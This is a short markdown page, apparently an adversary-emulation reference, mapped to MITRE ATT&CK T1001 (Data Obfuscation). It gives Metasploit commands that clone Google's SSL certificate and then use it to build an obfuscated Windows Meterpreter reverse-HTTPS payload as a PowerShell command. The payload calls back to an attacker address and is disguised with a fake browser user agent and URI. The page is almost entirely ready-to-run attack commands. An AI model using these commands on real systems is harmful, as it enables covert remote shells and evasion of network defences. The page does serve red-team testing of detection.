
# Data Obfuscation

MITRE ATT&CK Technique: [T1001](https://attack.mitre.org/wiki/Technique/T1001)



## Metasploit - Mimic Google Certificate

    use auxiliary/gather/impersonate_ssl
    set rhost www.google.com
    run

## Metasploit - Create Payload w/ Certificates

    Use payload/windows/meterpreter/reverse_https
    set stagerverifysslcert true
    set HANDLERSSLCERT /root/.msf4/loot/2017011813_609599.pem
    set LHOST 172.16.0.100
    set LPORT 443
    set MeterpreterUserAgent Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
    set LURI Secure/8984398439845AC33/Services/Status
    generate -t psh-cmd
